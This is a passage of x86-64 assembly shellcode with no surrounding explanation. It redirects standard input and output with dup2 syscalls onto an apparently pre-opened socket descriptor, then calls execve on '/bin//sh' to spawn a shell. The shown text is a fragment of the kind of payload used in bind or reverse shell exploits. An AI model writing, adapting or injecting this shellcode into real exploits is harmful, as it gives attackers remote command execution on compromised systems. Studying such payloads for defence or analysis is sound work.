        xor rsi, rsi
	mov al, 33
        syscall

        inc rsi
	mov al, 33
        syscall
        
; Execve
        xor rax, rax
        push rax

	mov rbx, 0x68732f2f6e69622f
	push rbx
	
	push rsp
	pop rdi
	
	push rax
	push rdi
	push rsp
	pop rsi
	
	cdq
	mov al, 59
        syscall

